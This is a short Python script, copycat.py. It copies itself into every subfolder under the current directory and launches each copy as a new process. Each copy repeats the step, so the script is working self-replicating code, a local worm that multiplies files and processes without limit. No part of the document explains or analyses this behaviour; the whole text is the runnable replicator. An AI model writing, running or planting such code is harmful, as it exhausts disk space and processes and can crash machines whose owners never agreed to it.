import os
import shutil
import subprocess
from sys import executable

def main():
	path = os.path.join(os.getcwd(), 'copycat.py')


	for root, dirs, files in os.walk(os.getcwd()):
		for subfolder in dirs:
			try:
				new_path = os.path.join(root, subfolder, 'copycat.py')
				if os.path.exists(new_path):
					continue
				shutil.copy(path,new_path)
				print(f'Copied to {subfolder}')
				subprocess.Popen([executable, new_path])
				print(f'Successfully launched {new_path}')
			except Exception as e:
				print(f'Something went wrong: {e}')
				input("Press Enter to continue...")

if __name__ == "__main__":
	main()